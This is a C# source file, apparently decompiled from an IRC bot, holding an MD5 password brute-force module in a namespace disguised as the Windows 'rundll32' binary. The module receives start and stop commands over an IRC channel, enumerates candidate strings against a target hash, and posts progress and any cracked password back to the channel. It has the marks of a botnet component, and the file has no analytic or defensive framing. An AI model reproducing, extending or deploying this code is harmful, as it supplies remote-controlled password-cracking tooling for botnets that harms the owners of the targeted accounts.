using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace rundll32.bruteforce;

internal class md5
{
	private struct curseObj
	{
		public int length;

		public int pos;

		public string baseS;

		public curseObj(int length, int pos, string baseS)
		{
			this.length = length;
			this.pos = pos;
			this.baseS = baseS;
		}
	}

	private static string _md5;

	private static char[] _chars;

	private static int _charCount;

	private static int _nowLength;

	private static int _start;

	private static int _end;

	private static bool _running = false;

	private static string _channel;

	private static irc _irc;

	private static Thread _thread;

	public static void start(irc irc, string channel, string md5, string chars, int start, int end)
	{
		if (!_running)
		{
			_irc = irc;
			_channel = channel;
			_md5 = md5;
			_chars = chars.ToCharArray();
			_charCount = chars.Length;
			_nowLength = 0;
			_start = start;
			_end = end + 1;
			_running = true;
			_thread = new Thread(loadThread);
			_thread.Start();
		}
	}

	public static void stop(irc irc, string channel)
	{
		if (_running)
		{
			_running = false;
			_thread.Abort();
			_irc.sendMessage(_channel, ".:MD5 Bruteforce:. - \u000313Stopped bruteforcing!");
		}
	}

	private static void loadThread()
	{
		for (int i = _start; i < _end; i++)
		{
			reCurse(new curseObj(i, 0, ""));
		}
		_irc.sendMessage(_channel, ".:MD5 Bruteforce:. - \u000313Couldn't find password!");
		stop(_irc, _channel);
	}

	private static void reCurse(object c)
	{
		if (_nowLength != ((curseObj)c).length)
		{
			_nowLength = ((curseObj)c).length;
			_irc.sendMessage(_channel, ".:MD5 Bruteforce:. - \u000313Now testing password with a length of \u000306 " + _nowLength + "\u000313 chars!");
		}
		if (((curseObj)c).pos < ((curseObj)c).length + 1)
		{
			for (int i = 0; i < _charCount; i++)
			{
				reCurse(new curseObj(((curseObj)c).length, ((curseObj)c).pos + 1, ((curseObj)c).baseS + _chars[i]));
			}
			if (_md5 == HashString(((curseObj)c).baseS))
			{
				_irc.sendMessage(_channel, ".:MD5 Bruteforce:. - \u000313Password found:\u000306 " + ((curseObj)c).baseS + "\u000313 !");
				stop(_irc, _channel);
			}
		}
	}

	private static string HashString(string Value)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(Value);
		bytes = mD5CryptoServiceProvider.ComputeHash(bytes);
		string text = "";
		for (int i = 0; i < bytes.Length; i++)
		{
			text += bytes[i].ToString("x2").ToLower();
		}
		return text;
	}
}
